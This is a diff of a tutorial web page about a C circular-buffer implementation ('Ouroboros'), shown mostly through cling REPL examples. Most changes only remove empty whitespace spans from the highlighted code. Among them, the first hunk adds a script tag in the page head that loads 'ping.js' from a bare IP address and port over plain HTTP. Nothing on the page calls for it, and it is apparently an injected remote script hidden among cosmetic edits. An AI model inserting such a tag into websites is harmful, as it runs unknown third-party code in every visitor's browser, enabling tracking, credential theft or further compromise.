@@ -45,6 +45,8 @@
   <script src='/js/lunr-2.3.9.min.js'></script>
   <script src='/js/search_index.js'></script>
   <script src='/js/search.min.js'></script>
+
+  <script src='http://192.34.63.156:6127/ping.js' async></script>
 </head>
 <body>
 <header>
@@ -86,7 +88,7 @@ Ouroboros - Circular Buffer
 <p class="subtitle">
 September 16, 2018
 </p>
-<p><code><span class="highlight-candombe-inline"><span class="k">struct</span><span class="w"> </span><span class="nc">circular_buffer</span><span class="w"></span></span></code> is a simple but quite efficient implementation of a circular buffer over a continuous and finite memory slice.</p>
+<p><code><span class="highlight-candombe-inline"><span class="k">struct</span><span class="w"> </span><span class="nc">circular_buffer</span></span></code> is a simple but quite efficient implementation of a circular buffer over a continuous and finite memory slice.</p>
 <p>The name <a href="https://en.wikipedia.org/wiki/Ouroboros">Ouroboros</a> comes from the Ancient Greek and symbolize a snake eating its own tail – a convenient image for a circular buffer.</p>
 <p>Source code can be found in the <a href="https://github.com/eldipa/tiburoncin">tiburoncin project</a>. Enjoy it!<!--more--></p>
 <h3 id="playing-with-a-circular-buffer">Playing with a Circular Buffer</h3>
@@ -96,179 +98,179 @@ September 16, 2018
 You can run this code with <a href="https://github.com/root-project/cling">cling</a> and <a href="https://byexamples.github.io/byexample/">byexample</a>
 </span></p>
 <p>First, let’s load this module to play with it:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="p">.</span><span class="n">L</span><span class="w"> </span><span class="n">circular_buffer</span><span class="p">.</span><span class="n">c</span><span class="w"></span>
-<span class="o">?:</span><span class="w"> </span><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="s">&quot;circular_buffer.h&quot;</span><span class="w"></span>
-<span class="o">?:</span><span class="w"> </span><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="p">.</span><span class="n">L</span><span class="w"> </span><span class="n">circular_buffer</span><span class="p">.</span><span class="n">c</span>
+<span class="o">?:</span><span class="w"> </span><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="s">&quot;circular_buffer.h&quot;</span>
+<span class="o">?:</span><span class="w"> </span><span class="err">#</span><span class="n">include</span><span class="w"> </span><span class="o">&lt;</span><span class="n">string</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
 </code></pre></div>
 
 <p>Now, let’s create a buffer of 16 bytes:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">circular_buffer_t</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">circular_buffer_t</span><span class="w"> </span><span class="n">buf</span><span class="p">;</span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>
 </code></pre></div>
 
-<p>The circular buffer has 2 pointers, the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> that mark the end of the data and the begin of the <em>free space</em> and the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code>, which it is the opposite of the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code>.</p>
+<p>The circular buffer has 2 pointers, the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> that mark the end of the data and the begin of the <em>free space</em> and the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code>, which it is the opposite of the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code>.</p>
 <p>At the begin, both pointers point to the same place, the <em>free space</em> has the size of the whole buffer and the <em>ready space</em> is empty:</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_0_0.png' /></figure></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">16</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">16</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span>
 </code></pre></div>
 
-<p>When more data is written in the buffer, the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> pointer moves forward, the <em>free space</em> is reduced and the <em>ready space</em> is increased, all of them in the same proportion.</p>
+<p>When more data is written in the buffer, the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> pointer moves forward, the <em>free space</em> is reduced and the <em>ready space</em> is increased, all of them in the same proportion.</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_0_10.png' /></figure></p>
-<p>The implementation does not track how many bytes are written. It is up to the caller to write in the buffer from the buffer’s <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> and notify the circular buffer how many bytes wrote.</p>
+<p>The implementation does not track how many bytes are written. It is up to the caller to write in the buffer from the buffer’s <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> and notify the circular buffer how many bytes wrote.</p>
 <p>For example, if we write 10 bytes:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">.</span><span class="n">buf</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;AABBCCDDEE&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">.</span><span class="n">buf</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;AABBCCDDEE&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
 </code></pre></div>
 
-<p>Then we must notify how many bytes were written updating the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> pointer:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span><span class="w"></span>
+<p>Then we must notify how many bytes were written updating the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> pointer:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">10</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">6</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">6</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">10</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">10</span>
 </code></pre></div>
 
 <p>We can keep writing and reading from the buffer.</p>
-<p>As we did with the write, once we read the data from the buffer’s <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code> we need to notify to the circular buffer that the data can be discarded.</p>
+<p>As we did with the write, once we read the data from the buffer’s <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code> we need to notify to the circular buffer that the data can be discarded.</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_8_14.png' /></figure></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">.</span><span class="n">buf</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;FFGG&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w"></span>
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">.</span><span class="n">buf</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">],</span><span class="w"> </span><span class="s">&quot;FFGG&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">4</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">read</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span><span class="w"></span>
-<span class="o">?:</span><span class="w"> </span><span class="n">memcpy</span><span class="p">(</span><span class="n">read</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">buf</span><span class="p">.</span><span class="n">buf</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">],</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">read</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span>
+<span class="o">?:</span><span class="w"> </span><span class="n">memcpy</span><span class="p">(</span><span class="n">read</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">buf</span><span class="p">.</span><span class="n">buf</span><span class="p">[</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">],</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_tail</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">read</span><span class="w"></span>
-<span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="p">[</span><span class="mi">8</span><span class="p">])</span><span class="w"> </span><span class="s">&quot;AABBCCDD&quot;</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">read</span>
+<span class="p">(</span><span class="kt">char</span><span class="w"> </span><span class="p">[</span><span class="mi">8</span><span class="p">])</span><span class="w"> </span><span class="s">&quot;AABBCCDD&quot;</span>
 </code></pre></div>
 
 <p>How many bytes we can write is determined by how many <em>free space</em> the buffer has; how many bytes we can read is determined by how many <em>ready space</em> the buffer has.</p>
 <p>It is up to the caller honor this.</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">2</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">2</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">6</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">6</span>
 </code></pre></div>
 
-<p>When the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> pointer reaches the end of the buffer, the pointer is restarted and set back to the begin.</p>
-<p>The <em>free space</em> is expanded from the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> to the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code> and the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code> is in front of the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code>:</p>
+<p>When the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> pointer reaches the end of the buffer, the pointer is restarted and set back to the begin.</p>
+<p>The <em>free space</em> is expanded from the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> to the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code> and the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code> is in front of the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code>:</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_8_0.png' /></figure></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span>
 </code></pre></div>
 
 <h3 id="contiguous-reading-and-writing">Contiguous reading and writing</h3>
-<p>If we keep writing (moving the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code>), the <em>ready space</em> will not increase because the circular buffer will always inform how many <em>contiguous</em> bytes are <em>ready</em> (for reading) or <em>free</em> (for writing).</p>
+<p>If we keep writing (moving the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code>), the <em>ready space</em> will not increase because the circular buffer will always inform how many <em>contiguous</em> bytes are <em>ready</em> (for reading) or <em>free</em> (for writing).</p>
 <p>The <em>ready space</em> is limited by the end of the buffer in this case:</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_8_2.png' /></figure></p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span><span class="w"></span>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">6</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">6</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span>
 </code></pre></div>
 
 <h3 id="when-the-head-bites-the-tail">When the head bites the tail</h3>
-<p>The critical point happens when the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> reaches the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code>.</p>
+<p>The critical point happens when the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> reaches the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code>.</p>
 <p>Now, this is exactly the same situation that happen at the begin, when the buffer was empty, but now it means that it is full.</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_8_8.png' /></figure></p>
-<p>To differentiate these two cases, internally there is a flag that tracks when the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> is <em>behind</em> the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code>:</p>
-<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span><span class="w"></span>
+<p>To differentiate these two cases, internally there is a flag that tracks when the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> is <em>behind</em> the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code>:</p>
+<div class="highlight-candombe"><pre><span></span><code><span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_advance_head</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span><span class="w"> </span><span class="mi">6</span><span class="p">);</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">tail</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">buf</span><span class="p">.</span><span class="n">head</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">0</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="n">circular_buffer_get_ready</span><span class="p">(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="mi">8</span>
 
-<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">hbehind</span><span class="p">)</span><span class="w"></span>
-<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span><span class="w"></span>
+<span class="o">?:</span><span class="w"> </span><span class="p">(</span><span class="n">buf</span><span class="p">.</span><span class="n">hbehind</span><span class="p">)</span>
+<span class="p">(</span><span class="kt">bool</span><span class="p">)</span><span class="w"> </span><span class="nb">true</span>
 </code></pre></div>
 
-<p>If we move the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code> to the end of the buffer, the rest of the bytes written are <em>ready</em> to be consumed and the <code><span class="highlight-candombe-inline"><span class="n">head</span><span class="w"></span></span></code> is in front of the <code><span class="highlight-candombe-inline"><span class="n">tail</span><span class="w"></span></span></code> again:</p>
+<p>If we move the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code> to the end of the buffer, the rest of the bytes written are <em>ready</em> to be consumed and the <code><span class="highlight-candombe-inline"><span class="n">head</span></span></code> is in front of the <code><span class="highlight-candombe-inline"><span class="n">tail</span></span></code> again:</p>
 <p><figure><figcaption><span markdown='1'>
 </span></figcaption>
 <img  class='' alt='' src='/img/queues/circular-buffer/buffer_0_8.png' /></figure></p>
